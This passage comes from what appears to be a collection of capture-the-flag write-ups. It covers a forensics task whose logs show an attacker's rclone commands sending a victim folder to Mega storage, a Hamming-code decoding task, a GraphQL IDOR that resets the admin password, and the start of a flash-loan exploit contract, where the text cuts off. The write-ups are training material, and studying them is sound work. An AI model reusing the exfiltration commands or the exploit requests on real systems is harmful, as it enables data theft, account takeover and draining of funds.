\u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 \u2023 Rclone Execution via     \u2502 1     \u2502 Microsoft-Windows-Sysmon \u2502 1        \u2502 78        \u2502 ---                            \u2502\n\u2502 Command Line or PowerShell \u2502       \u2502                          \u2502          \u2502           \u2502 CommandLine: \"\\\"C:\\\\Users\\\\wad \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 e\\\\AppData\\\\Local\\\\Temp\\\\rclon \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 e-v1.61.1-windows-amd64\\\\rclon \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 e.exe\\\" copy C:\\\\Users\\\\Wade\\\\ \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Desktop\\\\Relic_location\\\\ remo \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 te:exfiltration -v\"            \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Company: \"https://rclone.org\"  \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 CurrentDirectory: \"C:\\\\Users\\\\ \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 wade\\\\AppData\\\\Local\\\\Temp\\\\rc \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 lone-v1.61.1-windows-amd64\\\\\"  \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Description: Rsync for cloud s \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 torage                         \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 FileVersion: 1.61.1            \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Hashes: SHA256=E94901809FF7CC5 \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 168C1E857D4AC9CBB339CA1F6E21DC \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 CE95DFB8E28DF799961            \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Image: \"C:\\\\Users\\\\wade\\\\AppDa \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ta\\\\Local\\\\Temp\\\\rclone-v1.61. \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 1-windows-amd64\\\\rclone.exe\"   \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 IntegrityLevel: Medium         \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 LogonGuid: 10DA3E43-D892-63F8- \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 4B6D-030000000000              \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 LogonId: \"0x36d4b\"             \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 OriginalFileName: rclone.exe   \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentCommandLine: \"\\\"C:\\\\Wind \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ows\\\\System32\\\\WindowsPowerShe \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ll\\\\v1.0\\\\powershell.exe\\\" \"   \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentImage: \"C:\\\\Windows\\\\Sys \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 tem32\\\\WindowsPowerShell\\\\v1.0 \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 \\\\powershell.exe\"              \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentProcessGuid: 10DA3E43-D8 \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 D2-63F8-9B00-000000000900      \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentProcessId: 5888          \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentUser: \"DESKTOP-UTDHED2\\\\ \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 wade\"                          \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ProcessGuid: 10DA3E43-D935-63F \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 8-B200-000000000900            \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ProcessId: 5116                \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Product: Rclone                \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 RuleName: \"-\"                  \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 TerminalSessionId: 1           \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 User: \"DESKTOP-UTDHED2\\\\wade\"  \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 UtcTime: \"2023-02-24 15:35:17. \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 516\"                           \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>I deleted the <code>timestamp</code> and <code>Computer</code> column for smaller and brief output\\ So here we have the output and executed commands we want</p> <p>These are the commands executed for data <code>exfiltiration</code> with rclone</p> <pre><code>rclone config create remote mega user majmeret@protonmail.com pass FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI\nrclone copy C:\\\\Users\\\\Wade\\\\Desktop\\\\Relic_location\\\\ remote:exfiltration -v\n</code></pre> <p>According to challenge description let's launch instance and answer the questions to get the flag</p> <pre><code>What is the email of the attacker used for the exfiltration process? (for example: name@email.com)\n&gt; majmeret@protonmail.com\n[+] Correct!\n\nWhat is the password of the attacker used for the exfiltration process? (for example: password123)\n&gt; FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI\n[+] Correct!\n\nWhat is the Cloud storage provider used by the attacker? (for example: cloud)\n&gt; mega\n[+] Correct!\n\nWhat is the ID of the process used by the attackers to configure their tool? (for example: 1337)\n&gt; 3820\n[+] Correct!\n\nWhat is the name of the folder the attacker exfiltrated; provide the full path. (for example: C:\\Users\\user\\folder)\n&gt; C:\\Users\\Wade\\Desktop\\Relic_location \n[+] Correct!\n\nWhat is the name of the folder the attacker exfiltrated the files to? (for example: exfil_folder)\n&gt; exfiltration\n[+] Correct!\n\n[+] Here is the flag: HTB{3v3n_3xtr4t3rr3str14l_B31nGs_us3_Rcl0n3_n0w4d4ys}\n</code></pre> <p>And here is the flag</p> <pre><code>HTB{3v3n_3xtr4t3rr3str14l_B31nGs_us3_Rcl0n3_n0w4d4ys}\n</code></pre> <p>Authors - Kourosh Rajabzadeh</p>"},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/hardware/hm74/","title":"hm74","text":""},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/hardware/hm74/#1-challenge-code-and-description","title":"1 - Challenge code and description","text":"<pre><code>As you venture further into the depths of the tomb, your communication with your team becomes increasingly disrupted by noise.\nDespite their attempts to encode the data packets, the errors persist and prove to be a formidable obstacle.\nFortunately, you have the exact Verilog module used in both ends of the communication.\nWill you be able to discover a solution to overcome the communication disruptions and proceed with your mission?\n</code></pre> <pre><code>module encoder(\n    input [3:0] data_in,\n    output [6:0] ham_out\n    );\n\n    wire p0, p1, p2;\n\n    assign p0 = data_in[3] ^ data_in[2] ^ data_in[0];\n    assign p1 = data_in[3] ^ data_in[1] ^ data_in[0];\n    assign p2 = data_in[2] ^ data_in[1] ^ data_in[0];\n\n    assign ham_out = {p0, p1, data_in[3], p2, data_in[2], data_in[1], data_in[0]};\nendmodule\n\nmodule main;\n    wire[3:0] data_in = 5;\n    wire[6:0] ham_out;\n\n    encoder en(data_in, ham_out);\n\n    initial begin\n        #10;\n        $display(\"%b\", ham_out);\n    end\nendmodule\n</code></pre> <p>Here we have a verilog code which splits input data into <code>4 bit arrays</code> and generate a parity checksum for them with <code>encoder</code> (p0,p1,p2)\\ So in output data we have <code>4 bit input data</code> and parity check <code>p0,p1,p2</code> which is for error detection\\ According to the challenge description this data is transfer and there are a lot of noice on it.</p>"},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/hardware/hm74/#2-solution","title":"2 - Solution","text":"<p>To solve this lab we should use that parity check bits to ensure if the data was changed or got any noice or not.\\ Overall solution is like below:</p> <ol> <li>Capture raw binary data</li> <li>Split it into <code>7 bit</code> pieces</li> <li>generate a python dictionary foreach block with default value of <code>False</code> for each block which indicates we determine all blocks to got errored</li> <li>Check parity for each <code>7 bit</code> block with chech_parity function and if it is true update it in dictionary with the value <code>True</code></li> <li>Because each captured data has random noices, Repeat these steps and update each <code>7 bit block</code> if it has True parity_check until all blocks have True parity check</li> <li>get <code>4 bit</code> raw data from <code>7 bit</code> blocks concat to gether and decode it from binary to ascii</li> </ol> <p>Here is the overall process in python </p><pre><code>import socket\n\nHOST = '167.172.50.208'\nPORT = 30920\n\ndef parse(data):\n    return data[2] + data[4] + data[5] + data[6]\n\n\ndef check_parity(data_in):\n\n    enc = [int(i) for i in data_in]\n\n    p0 = enc[2] ^ enc[4] ^ enc[6]\n    p1 = enc[2] ^ enc[5] ^ enc[6]\n    p2 = enc[4] ^ enc[5] ^ enc[6]\n\n    return (p0 == enc[0] and p1 == enc[1] and p2 == enc[3])\n\n\ndef check_result(data):\n    for d in data:\n        if not data[d]:\n            return False\n\n    return True\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect((HOST, PORT))\nresults = []\nresult = {}\nfor i in range(0, 952, 7):\n    result[i] = ''\nraw = ''\n\nwhile True:\n    raw_enc = sock.recv(2048).decode().strip()[10:]\n\n    size = len(raw_enc)\n    encs = [raw_enc[i:i+7] for i in range(0, size, 7)]\n\n    index = 0\n    for raw_enc in encs:\n        if check_parity(raw_enc):\n            result[index] = raw_enc\n        index += 7\n\n    if check_result(result):\n        raw = ''.join([result[d] for d in result])\n        break\n\n\nindex = 0\nmessage = ''\nsize = len(raw)\n\nfor i in range(0, size, 7):\n    message += parse(raw[i:i+7])\n    index += 1\n\nflag = bytes.fromhex(hex(int(message,2))[2:])\nprint(flag)\n</code></pre><p></p> <p>If we run the code we get a flag but it is still noised the reason is that this custom parity check is not 100% true for error detection </p><pre><code>python solve.py\nb'HTB{hcm_w?thWs0m3\\x1fo.a\\x11ys15_y\\x10u_c4n_3\\xf87ract_\\x07hs_h4mmIn9_7_t_3&gt;\\xe3_fl49y'\n</code></pre><p></p> <p>So we should repeat executing it an getting errored flags and manually fix noised characters\\ Here are 10 output each one gives us different data </p><pre><code>HTB{hmm_w1th_s0m3_ana1ys15_y0u_c4n_3x7ract_7h3_h4mmin9_7_4_3nc_fl49}\nHTB{hmo_y1\u00e4h_s0m;_ana1ys15_y\u00d0u_C4n_3q7rac\u0094_7l\u00b3_\u00e80mm)n;_7[4_;nc_fl4yt\nHTF{hmm\u00bfw1ta_s0m3\u00cfanB1's1u_y0u\u00bf\u00f34n_cx7rdct_7h3_h4mmkk9_7_:_snc_fl49t\nHTB{h\u00fdm_w1th_s0m3_an\u00f4\u0001ys15_y0u_#4n_3x\u0017\u00e2act_7h3_h4mmi\u008e9_7_4_3nf_fl49s\nHTB\u007fhhm_t1th_s0\u00fd3_ana1ws15_ypu_#\u00b4n[6x\u00d7r\u0081ct_7h3[h\u0004mmgn9_7_4_3nc_fl:7}\nHTB\u007fhmm_w1th_s0m3_ala1}#15\u000fy0u_c4n_6x7rac$_\u00a9H6_l4emin:_\u00a7_4_3nc_fl4y\u00fd\nHtBr(=m_^1th_s0m3_hna1ys15]y0u_c\u0014n_3x7ra\u00f3}_7f3]h4mnin\u00b9\u001fg_4_3^c_fl49}\nHTAyh=m_w1t\u00f8aq0m_!na1ys\u00115_y0u_c4n_3x\u00d7rac\u0094_7h3_h4omin9\\\u0017_4_3nj_fl49}\nxTB{hmm_w1Dh\u00bf30m3_ana1\u00e9p15_y0u_c\u0004n_3x7ract_5h=_h:mmin9_7\u001f4_3\u00fej\u00dffl\u00a49}\nH\u0014B{h\u00e3m_'1th_\u00e30m3_aga1ys15\\y0u_\u00836n_3x7racD_\u00d7m3_h4cmin9\u00df7_4_3kc_fl49}\n</code></pre><p></p> <p>We can manually extract correct flag characters based on words meanings\\ And here is the final correct flag </p><pre><code>HTB{hmm_w1th_s0m3_ana1ys15_y0u_c4n_3x7ract_7h3_h4mmin9_7_4_3nc_fl49}\n</code></pre><p></p> <p>Authors - Kourosh Rajabzadeh</p>"},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/web/passman/","title":"passman","text":""},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/web/passman/#1-challenge-code-and-descripton","title":"1 - Challenge code and Descripton","text":"<pre><code>Pandora discovered the presence of a mole within the ministry.\nTo proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager.\nCan you hack into the password manager?\n</code></pre> <p>We ae given the project files including backeng js, dockerfile, database queries and ...</p> <ol> <li>First of all this is DB tables</li> </ol> <p></p><pre><code>CREATE DATABASE passman;\n\nCREATE TABLE passman.users (\n    id          INT NOT NULL AUTO_INCREMENT,\n    username    VARCHAR(256) UNIQUE NOT NULL,\n    password    VARCHAR(256) NOT NULL,\n    email       VARCHAR(256) UNIQUE NOT NULL,\n    is_admin    INT NOT NULL DEFAULT 0,\n    PRIMARY KEY (id)\n);\n\nINSERT INTO passman.users (username, password, email, is_admin)\nVALUES\n    ('admin', '$(genPass)', 'admin@passman.htb', 1),\n    ('louisbarnett', '$(genPass)', 'louis_p_barnett@mailinator.com', 0),\n    ('ninaviola', '$(genPass)', 'ninaviola57331@mailinator.com', 0),\n    ('alvinfisher', '$(genPass)', 'alvinfisher1979@mailinator.com', 0);\n\n\nCREATE TABLE IF NOT EXISTS passman.saved_passwords (\n    id         INT NOT NULL AUTO_INCREMENT,\n    owner      VARCHAR(256) NOT NULL,\n    type       VARCHAR(256) NOT NULL,\n    address    VARCHAR(256) NOT NULL,\n    username   VARCHAR(256) NOT NULL,\n    password   VARCHAR(256) NOT NULL,\n    note       VARCHAR(256) NOT NULL,\n    PRIMARY KEY (id)\n);\n\nINSERT INTO passman.saved_passwords (owner, type, address, username, password, note)\nVALUES\n    ('admin', 'Web', 'igms.htb', 'admin', 'HTB{f4k3_fl4g_f0r_t3st1ng}', 'password'),\n    ('louisbarnett', 'Web', 'spotify.com', 'louisbarnett', 'YMgC41@)pT+BV', 'student sub'),\n    ('louisbarnett', 'Email', 'dmail.com', 'louisbarnett@dmail.com', 'L-~I6pOy42MYY#y', 'private mail'),\n    ('ninaviola', 'Web', 'office365.com', 'ninaviola1', 'OfficeSpace##1', 'company email'),\n    ('alvinfisher', 'App', 'Netflix', 'alvinfisher1979', 'efQKL2pJAWDM46L7', 'Family Netflix'),\n    ('alvinfisher', 'Web', 'twitter.com', 'alvinfisher1979', '7wYz9pbbaH3S64LG', 'old twitter account');\n\nGRANT ALL ON passman.* TO 'passman'@'%' IDENTIFIED BY 'passman' WITH GRANT OPTION;\nFLUSH PRIVILEGES;\n</code></pre> If we look closer we see that the flag is inside <code>saved_passwords</code> table which is for admin user<p></p> <ol> <li>We also have graphql in backend which do login,register,save password, ...</li> </ol> <p>Here is register request</p> <pre><code>POST /graphql HTTP/1.1\nHost: 138.68.162.218:32084\nContent-Length: 237\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36\nContent-Type: application/json\nAccept: */*\nOrigin: http://138.68.162.218:32084\nReferer: http://138.68.162.218:32084/register\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,fa;q=0.8\nConnection: close\n\n{\n  \"query\": \"mutation($email: String!, $username: String!, $password: String!) { RegisterUser(email: $email, username: $username, password: $password) { message } }\",\n  \"variables\": {\n    \"email\": \"test@test.com\",\n    \"username\": \"0x17\",\n    \"password\": \"1234\"\n  }\n}\n</code></pre> <p>And here is the backed graphql section for registration which is <code>Graphql Mutation</code></p> <pre><code>name: 'Mutation',\nfields: {\n    RegisterUser: {\n        type: ResponseType,\n        args: {\n            email: { type: new GraphQLNonNull(GraphQLString) },\n            username: { type: new GraphQLNonNull(GraphQLString) },\n            password: { type: new GraphQLNonNull(GraphQLString) }\n        },\n        resolve: async (root, args, request) =&gt; {\n            return new Promise((resolve, reject) =&gt; {\n                db.registerUser(args.email, args.username, args.password)\n                    .then(() =&gt; resolve(response(\"User registered successfully!\")))\n                    .catch(err =&gt; reject(new GraphQLError(err)));\n            });\n        }\n    },\n</code></pre> <p>Here is login request</p> <pre><code>POST /graphql HTTP/1.1\nHost: 138.68.162.218:32084\nContent-Length: 185\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36\nContent-Type: application/json\nAccept: */*\nOrigin: http://138.68.162.218:32084\nReferer: http://138.68.162.218:32084/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,fa;q=0.8\nConnection: close\n\n{\n  \"query\": \"mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }\",\n  \"variables\": {\n    \"username\": \"0x17\",\n    \"password\": \"1234\"\n  }\n}\n</code></pre> <p>And here is the backend graphql code which is also a <code>Graphql Mutation</code></p> <pre><code>LoginUser: {\n    type: ResponseType,\n    args: {\n        username: { type: new GraphQLNonNull(GraphQLString) },\n        password: { type: new GraphQLNonNull(GraphQLString) }\n    },\n    resolve: async (root, args, request) =&gt; {\n        return new Promise((resolve, reject) =&gt; {\n            db.loginUser(args.username, args.password)\n                .then(async (user) =&gt; {\n                    if (user.length) {\n                        let token = await JWTHelper.sign( user[0] );\n                        resolve({\n                            message: \"User logged in successfully!\",\n                            token: token\n                        });\n                    };\n                    reject(new Error(\"Username or password is invalid!\"));\n                })\n                .catch(err =&gt; reject(new GraphQLError(err)));\n        });\n    }\n},\n</code></pre>"},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/web/passman/#2-solution","title":"2 - Solution","text":"<ul> <li>After logging in a JWT is assigned to us which indicates our user.</li> <li>Our goal is to get flag which is inside saved_passwords database inside admin notes</li> <li>Each user can see his/her only notes not others according to this code which is a <code>Graphql Query</code></li> </ul> <pre><code>name: 'Query',\nfields: {\n    getPhraseList: {\n        type: new GraphQLList(PhraseSchema),\n        resolve: async (root, args, request) =&gt; {\n            return new Promise((resolve, reject) =&gt; {\n                if (!request.user) return reject(new GraphQLError('Authentication required!'));\n\n                db.getPhraseList(request.user.username)\n                    .then(rows =&gt; resolve(rows))\n                    .catch(err =&gt; reject(new GraphQLError(err)))\n            });\n        }\n    }\n}\n</code></pre> <p>So we as a non-admin user can not see admin<code>s notes which is flag. There are also two other</code>Graphql Mutations`</p> <p>AddPhrase : which is for adding note</p> <pre><code>AddPhrase: {\n    type: ResponseType,\n    args: {\n        recType: { type: new GraphQLNonNull(GraphQLString) },\n        recAddr: { type: new GraphQLNonNull(GraphQLString) },\n        recUser: { type: new GraphQLNonNull(GraphQLString) },\n        recPass: { type: new GraphQLNonNull(GraphQLString) },\n        recNote: { type: new GraphQLNonNull(GraphQLString) },\n    },\n    resolve: async (root, args, request) =&gt; {\n        return new Promise((resolve, reject) =&gt; {\n            if (!request.user) return reject(new GraphQLError('Authentication required!'));\n\n            db.addPhrase(request.user.username, args)\n                .then(() =&gt; resolve(response(\"Phrase added successfully!\")))\n                .catch(err =&gt; reject(new GraphQLError(err)));\n        });\n    }\n  },\n</code></pre> <p>UpdatePassword: which is for changing password for a user</p> <pre><code>UpdatePassword: {\n    type: ResponseType,\n    args: {\n        username: { type: new GraphQLNonNull(GraphQLString) },\n        password: { type: new GraphQLNonNull(GraphQLString) }\n    },\n    resolve: async (root, args, request) =&gt; {\n        return new Promise((resolve, reject) =&gt; {\n            if (!request.user) return reject(new GraphQLError('Authentication required!'));\n\n            db.updatePassword(args.username, args.password)\n                .then(() =&gt; resolve(response(\"Password updated successfully!\")))\n                .catch(err =&gt; reject(new GraphQLError(err)));\n        });\n    }\n},\n</code></pre> <p>The <code>UpdatePassword</code> Mutation looks interesting and as we can see there is no proper authentication to prevent nonadmin users to change other users' password\\ Let's look at the <code>UpdatePassword Mutation</code> schema through graphql introspection query</p> <pre><code>POST /graphql HTTP/1.1\nHost: 138.68.162.218:32084\nContent-Length: 106\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36\nContent-Type: application/json\nAccept: */*\nOrigin: http://138.68.162.218:32084\nReferer: http://138.68.162.218:32084/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,fa;q=0.8\nConnection: close\n\n{\n  \"query\": \"{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}\"\n}\n</code></pre> <p>And here is the <code>UpdatePassword</code> Mutation</p> <pre><code>{\n  \"name\": \"UpdatePassword\",\n  \"args\": [\n    {\n      \"name\": \"username\",\n      \"description\": null,\n      \"type\": {\n        \"name\": null,\n        \"kind\": \"NON_NULL\",\n        \"ofType\": {\n          \"name\": \"String\",\n          \"kind\": \"SCALAR\"\n        }\n      }\n    },\n    {\n      \"name\": \"password\",\n      \"description\": null,\n      \"type\": {\n        \"name\": null,\n        \"kind\": \"NON_NULL\",\n        \"ofType\": {\n          \"name\": \"String\",\n          \"kind\": \"SCALAR\"\n        }\n      }\n    }\n  ]\n}\n</code></pre> <p>We can see we need two parameters (username,password) which we can change every user's password without proper authorization.\\ Here is the graphql query for updating admin's password (I built it based on login mutation which is similar to UpdatePassword)</p> <pre><code>POST /graphql HTTP/1.1\nHost: 138.68.162.218:32084\nContent-Length: 191\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36\nContent-Type: application/json\nAccept: */*\nOrigin: http://138.68.162.218:32084\nReferer: http://138.68.162.218:32084/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,fa;q=0.8\nConnection: close\nCookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjB4MTciLCJpc19hZG1pbiI6MCwiaWF0IjoxNjc5Nzk3MDQ0fQ.54ogANqo_0hbJBlo_RtgWQDOoUQ3qeRz7ayBqW4KosU\n\n{\n  \"query\": \"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message, token } }\",\n  \"variables\": {\n    \"username\": \"admin\",\n    \"password\": \"1234\"\n  }\n}\n</code></pre> <p>And here is the response:</p> <pre><code>{\n  \"data\": {\n    \"UpdatePassword\": {\n      \"message\": \"Password updated successfully!\",\n      \"token\": null\n    }\n  }\n}\n</code></pre> <p>It seems we changed admin's password, Let's check it\\ Yes, we logged in as admin and now we can see admin's notes inside saved_password table which is actually the flag</p> <pre><code>POST /graphql HTTP/1.1\nHost: 138.68.162.218:32084\nContent-Length: 84\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36\nContent-Type: application/json\nAccept: */*\nOrigin: http://138.68.162.218:32084\nReferer: http://138.68.162.218:32084/dashboard\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,fa;q=0.8\nCookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlhdCI6MTY3OTc5ODMyOH0.uZ5Bqop3SSoHX4cgxHZn6kJLKXT3CX3d3wz9WLE4bRw\nConnection: close\n\n{\n  \"query\": \"{ getPhraseList { id, owner, type, address, username, password, note } }\"\n}\n</code></pre> <pre><code>{\n  \"data\": {\n    \"getPhraseList\": [\n      {\n        \"id\": \"1\",\n        \"owner\": \"admin\",\n        \"type\": \"Web\",\n        \"address\": \"igms.htb\",\n        \"username\": \"admin\",\n        \"password\": \"HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}\",\n        \"note\": \"password\"\n      }\n    ]\n  }\n}\n</code></pre> <p>And here is the flag: </p><pre><code>HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}\n</code></pre><p></p> <p>Authors - Kourosh Rajabzadeh</p>"},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/","title":"CyberApocalypse 2024 writeups","text":""},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/#hackthebpx-cyberapocalypse-2024","title":"HackTheBpx CyberApocalypse 2024","text":""},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/ledgerheist/","title":"Ledger Heist","text":""},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/ledgerheist/#ledger-heist","title":"Ledger Heist","text":""},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/ledgerheist/#code-description","title":"code / Description","text":"<pre><code>function deposit(uint256 amount) external {\n    address _msgsender = msg.sender;\n\n    _updateFees(_msgsender);\n    IERC20Minimal(underlying).transferFrom(_msgsender, address(this), amount);\n\n    _mint(_msgsender, amount);\n}\n</code></pre> <pre><code>function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)\n    external\n    returns (bool)\n{\n    if (token != underlying) {\n        revert NotSupported(token);\n    }\n\n    IERC20Minimal _token = IERC20Minimal(underlying);\n    uint256 _balanceBefore = _token.balanceOf(address(this));\n\n    if (amount &gt; _balanceBefore) {\n        revert InsufficientBalance();\n    }\n\n    uint256 _fee = _computeFee(amount);\n    _token.transfer(address(receiver), amount);\n\n    if (\n        receiver.onFlashLoan(msg.sender, underlying, amount, _fee, data)\n            != keccak256(\"ERC3156FlashBorrower.onFlashLoan\")\n    ) {\n        revert CallbackFailed();\n    }\n\n    uint256 _balanceAfter = _token.balanceOf(address(this));\n    if (_balanceAfter &lt; _balanceBefore + _fee) {\n        revert LoanNotRepaid();\n    }\n\n    // Accumulate fees and update feePerShare\n    uint256 interest = _balanceAfter - _balanceBefore;\n    feePerShare += interest.fixedDivFloor(totalSupply, BONE);\n\n    emit FlashLoanSuccessful(address(receiver), msg.sender, token, amount, _fee);\n    return true;\n}\n</code></pre>"},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/ledgerheist/#challenge-analysis","title":"Challenge Analysis","text":"<p>This challenge revolves around a smart contract that implements a flash loan feature, which allows borrowing assets with the obligation of returning them within the same transaction. The vulnerability arises from improper handling of the loan repayment mechanism. The contract permits the depositing of flash-loaned assets directly back into the pool without proper validation of the repayment source or completion status. This flaw, combined with a faulty deposit function, results in the minting of tokens to the sender and improperly assigns credit, which the sender can later withdraw, leading to the potential draining of ETH from the contract.</p>"},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/ledgerheist/#solution","title":"Solution","text":"<ol> <li>Deploy Attacker Contract: First, deploy an attacker contract implementing IERC3156FlashBorrower. In the constructor of this contract, set the target flash loan pool, approve the flash loan amount, and prepare for receiving the loan by setting the maximum loan amount and ensuring the contract can handle the token involved.</li> </ol> <pre><code>contract BadBorrower is IERC3156FlashBorrower {\n    address target;\n    uint maxloan;\n    address underlying;\n\n    constructor(address _target) {\n        target = _target;\n        underlying = ILoanPool(_target).underlying(); \n        maxloan = ILoanPool(_target).maxFlashLoan(underlying);\n\n        try IToken(underlying).approve(_target, type(uint256).max) {} catch {\n            revert(\"cant add LoanPool to attacker allowancea\");\n        }\n    }\n\n    function onFlashLoan(\n        address initiator,\n        address token,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata data\n    ) public returns (bytes32) {\n        